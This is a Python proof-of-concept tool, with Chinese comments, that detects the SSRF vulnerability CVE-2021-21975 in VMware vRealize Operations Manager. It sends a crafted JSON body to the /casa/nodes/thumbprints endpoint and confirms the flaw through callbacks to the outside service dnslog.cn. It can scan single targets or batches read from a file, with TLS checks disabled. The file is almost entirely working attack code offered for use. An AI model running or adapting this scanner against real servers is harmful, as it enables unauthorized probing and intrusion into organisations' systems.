'''
Author: luckying
Date: 2021-03-24 15:01:29
LastEditTime: 2021-04-01 16:15:51
LastEditors: Please set LastEditors
Description: In User Settings Edit
FilePath: \Apache OFBiz\12.py
'''
import binascii
import requests
import subprocess
import time
import json
import os
import sys
from requests.sessions import session
os.system('')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse
class CVE_2021_21957():
    def title(self):
        print('''
+-----------------------------------------------------------------+
漏洞名称:VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975  
功能：基于dnslog回显进行检测，单个检测，批量检测                                     
单个检测：python poc.py -u url -d domain
批量检测：python poc.py -f 1.txt
+-----------------------------------------------------------------+                                     
''')
    #漏洞检测
    def poc(self, target_url, domain,session):
        url = f'{target_url}/casa/nodes/thumbprints'
        headers = {'Content-Type': 'application/json;charset=UTF-8'}
        data = f'["{domain}"]'
        try:
            res = session.post(url=url,
                                headers=headers,
                                data=data,
                                verify=False,
                                timeout=20)
            
            return res.status_code
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
            
    #随机获取域名
    def dnslog_getdomain(self, session):
        url = 'http://www.dnslog.cn/getdomain.php?t=0'
        try:
            res = session.get(url, verify=False, timeout=20)
            return res.text
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    #获取dnslog响应信息
    def dnslog_getrecords(self, session, target_url, domain, count):
        url = 'http://www.dnslog.cn/getrecords.php?t=0'
        try:
            res = session.get(url, verify=False, timeout=20)
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
        if domain in res.text:
            if count == 0:
                print(f'[+] 获取到{domain}信息，目标 {target_url} 可能存在SSRF漏洞')
            else:
                print(f'[{str(count)}] 获取到{domain}信息，目标 {target_url} 可能存在SSRF漏洞')
    def main(self, target_url, dnslog_url, file):
        session=requests.session()
        count = 0  #批量检测时计数用
        self.title()
        #手动输入域名
        if target_url and dnslog_url:
            print('[+] 正在请求dnslog--------')
            status_code=self.poc(target_url, dnslog_url,session)
            if status_code==200:
                print(f'[+] 响应值为{status_code}，请自行查看dnslog信息')
                
        #随机获取dnslog域名
        elif target_url:
            session = requests.session()
            domain = self.dnslog_getdomain(session)
            self.poc(target_url, domain,session)
            self.dnslog_getrecords(session, target_url, domain, count)
        #批量检测
        elif file:
            for url in file:
                count += 1
                target_url = url.replace('\n', '')  #取消换行符
                session = requests.session()
                domain = self.dnslog_getdomain(session)
                time.sleep(1)
                self.poc(target_url, domain,session)
                self.dnslog_getrecords(session, target_url, domain, count)
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=False,
                        help="目标地址，带上http://")
    parser.add_argument("-d",
                        '--dnslog',
                        type=str,
                        default=False,
                        help="dnslog地址，不带http://")
    parser.add_argument("-f",
                        '--file',
                        type=argparse.FileType('r'),
                        default=False,
                        help="批量检测，带上http://")
    args = parser.parse_args()
    run = CVE_2021_21957()
    run.main(args.url, args.dnslog, args.file)
